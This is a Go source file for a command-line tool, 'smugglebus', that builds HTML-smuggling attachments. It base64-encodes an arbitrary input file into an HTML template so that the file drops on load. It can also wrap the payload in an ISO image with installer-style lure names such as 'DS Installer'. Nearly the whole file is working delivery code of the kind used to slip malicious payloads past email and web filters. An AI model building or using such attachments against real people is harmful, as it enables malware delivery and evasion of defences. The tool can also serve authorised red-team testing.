package main

import (
	"bytes"
	"crypto/md5"
	"crypto/sha1"
	"crypto/sha256"
	"encoding/base64"
	"fmt"
	"html/template"
	"io"
	"os"
	"path/filepath"
	"time"

	_ "embed"

	"github.com/akamensky/argparse"
	"github.com/kdomanski/iso9660"
)

//go:embed template.html
var tmpl string

func hashit(name string, data []byte) {
	fmt.Printf("[*] md5 (%s): %x\n", name, md5.Sum(data))
	fmt.Printf("[*] sha1 (%s): %x\n", name, sha1.Sum(data))
	fmt.Printf("[*] sha256 (%s): %x\n", name, sha256.Sum256(data))
}

func createHTML(data []byte, droppedFilename string, destFile *os.File) (err error) {
	b64 := base64.StdEncoding.EncodeToString([]byte(data))
	s := struct {
		DroppedFilename string
		Base64Encoded   string
	}{
		droppedFilename,
		b64,
	}
	tmp, err := template.New("tmpl").Parse(tmpl)
	if err != nil {
		return
	}
	err = tmp.Execute(destFile, s)
	if err != nil {
		return
	}
	return
}

// FSItem is to be used by generateISO9660 to populate filesystem image
type FSItem struct {
	// Pathname is the pathname of the file in the image, such as "/folder/README.md"
	Pathname string
	// Content is the contents of the file
	Content []byte
}

func generateISO9660(items []FSItem, volume string) (out []byte, err error) {
	writer, err := iso9660.NewWriter()
	if err != nil {
		return
	}
	for _, item := range items {
		b := bytes.NewBuffer(item.Content)
		writer.AddFile(b, item.Pathname)
	}
	o := new(bytes.Buffer)
	writer.WriteTo(o, volume)
	out = o.Bytes()
	return
}

func main() {
	parser := argparse.NewParser("smugglebus", "Creates HTML attachment for HTML smuggling")
	inputFile := parser.File("i", "input", os.O_RDONLY, 0600, &argparse.Options{Required: true, Help: "Input filename to smuggle"})
	outputFile := parser.File("o", "output", os.O_CREATE|os.O_RDWR, 0600, &argparse.Options{Required: true, Help: "Output filename to generate"})
	iso9660 := parser.Flag("c", "iso9660", &argparse.Options{Default: false, Help: "Encode in iso9660 format"})
	isoVolume := parser.String("v", "isovolume", &argparse.Options{Default: "DS Installer", Help: "Volume name for ISO9660 image, if enabled"})
	droppedFilename := parser.String("f", "dropped-name", &argparse.Options{Default: "installer.iso", Help: "Filename of dropped download file"})
	payloadFilename := parser.String("p", "payload-name", &argparse.Options{Default: "installer.dat", Help: "Filename of file in iso file"})

	err := parser.Parse(os.Args)
	if err != nil {
		// In case of error print error and print usage
		// This can also be done by passing -h or --help flags
		fmt.Print(parser.Usage(err))
		os.Exit(1)
	}
	inputContents, err := io.ReadAll(inputFile)
	if err != nil {
		panic(err)
	}
	t := time.Now()
	fmt.Printf("[+] smugglebus invoked at %s\n", t.Format(time.RFC822))
	var bytesToEncode []byte
	if *iso9660 {
		fsItems := []FSItem{
			{
				*payloadFilename,
				inputContents,
			},
		}
		bytesToEncode, err = generateISO9660(fsItems, *isoVolume)
		if err != nil {
			panic(err)
		}
		err := os.WriteFile(*droppedFilename, bytesToEncode, 0644)
		if err != nil {
			panic(err)
		}
	} else {
		bytesToEncode = inputContents
	}
	hashit(*droppedFilename, bytesToEncode)
	err = createHTML(bytesToEncode, *droppedFilename, outputFile)
	if err != nil {
		panic(err)
	}
	outputFile.Seek(0, 0)
	outputContents, err := io.ReadAll(outputFile)
	if err != nil {
		panic(err)
	}
	outfilename := filepath.Base(outputFile.Name())
	hashit(outfilename, outputContents)
	fmt.Println("[+] Have a nice day!")
}
